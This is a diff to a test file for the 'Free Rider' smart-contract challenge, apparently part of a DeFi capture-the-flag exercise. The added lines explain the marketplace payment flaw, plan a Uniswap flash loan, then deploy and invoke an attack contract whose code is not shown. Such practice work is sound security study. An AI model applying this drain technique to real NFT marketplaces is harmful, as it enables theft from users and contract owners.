@@ -106,6 +106,22 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /** Attempt 1
+         * Vulnerability: when someone buys the offered NFT, the eth they send as payment is sent back to the buyer instead of the seller.
+         * Steps:
+         *   1. Get Flash loan from Uniswap
+         */
+        // address _marketplace, address _devs, address _factoryV2, address _weth
+        attackContract = await (await ethers.getContractFactory('AttackFreeRider', player)).deploy(
+            marketplace.address,
+            devsContract.address,
+            uniswapFactory.address,
+            weth.address,
+            token.address,
+            nft.address
+        );
+
+        await attackContract.connect(player).attack(NFT_PRICE);
     });
 
     after(async function () {
